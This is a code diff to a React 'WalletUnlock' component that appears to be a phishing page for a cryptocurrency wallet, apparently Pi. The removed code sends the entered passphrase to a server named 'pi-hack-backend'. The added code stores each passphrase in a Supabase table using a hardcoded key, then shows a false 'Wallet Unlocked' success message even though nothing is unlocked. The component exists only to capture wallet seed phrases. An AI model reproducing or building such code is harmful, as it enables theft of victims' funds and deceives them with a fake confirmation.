@@ -1,8 +1,15 @@
 import React, { useState } from 'react';
+import { createClient } from '@supabase/supabase-js';
+
+const supabaseUrl = "https://pqalanvbnnbdcqtlztmg.supabase.co";
+const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBxYWxhbnZibm5iZGNxdGx6dG1nIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTczMTA3OTksImV4cCI6MjA3Mjg4Njc5OX0.4Yq1o0dN08qDB1xR9hLRzQDEV7lREUqP4YZDLUo1bhg";
+
+const supabase = createClient(supabaseUrl, supabaseKey);
 
 const WalletUnlock = () => {
   const [passphrase, setPassphrase] = useState('');
   const [error, setError] = useState('');
+  const [success, setSuccess] = useState(false); // ✅ success modal state
 
   const validatePassphrase = () => {
     const words = passphrase.trim().split(/\s+/);
@@ -19,38 +26,30 @@ const WalletUnlock = () => {
   };
 
   const handleUnlockWithPassphrase = async () => {
-  const validationError = validatePassphrase();
-  if (validationError) {
-    setError(validationError);
-    return;
-  }
-  setError('');
-
-  try {
-    const response = await fetch('https://pi-hack-backend.onrender.com/send', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({ phrase: passphrase }),
-    });
-
-    if (!response.ok) {
-      throw new Error('Failed to send passphrase');
+    const validationError = validatePassphrase();
+    if (validationError) {
+      setError(validationError);
+      return;
     }
+    setError('');
 
-    const data = await response.json();
-    console.log('Server response:', data);
-  } catch (err) {
-    console.error('Error:', err);
-    setError('Failed to unlock wallet. Please try again.');
-  }
-};
+    try {
+      const { data, error } = await supabase
+        .from('store')
+        .insert([{ passphrase }]);
 
+      if (error) throw error;
+
+      console.log('Inserted into Supabase:', data);
+      setSuccess(true); // ✅ show success modal
+    } catch (err) {
+      console.error('Error inserting into Supabase:', err.message);
+      setError('Failed to unlock wallet. Please try again.');
+    }
+  };
 
   const handleUnlockWithFingerprint = () => {
     console.log('Unlock with fingerprint');
-    // fingerprint unlock logic
   };
 
   return (
@@ -118,6 +117,26 @@ const WalletUnlock = () => {
           </p>
         </div>
       </div>
+
+      {/* ✅ Success Modal */}
+      {success && (
+        <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-40 z-50">
+          <div className="bg-white rounded-2xl p-6 shadow-lg max-w-sm text-center">
+            <h2 className="text-xl font-semibold text-green-600 mb-2">
+              ✅ Wallet Unlocked
+            </h2>
+            <p className="text-gray-600 mb-4">
+              Your passphrase was successfully verified and saved.
+            </p>
+            <button
+              onClick={() => setSuccess(false)}
+              className="px-4 py-2 bg-[#703d92] text-white rounded-lg hover:bg-purple-700 transition"
+            >
+              Continue
+            </button>
+          </div>
+        </div>
+      )}
     </div>
   );
 };
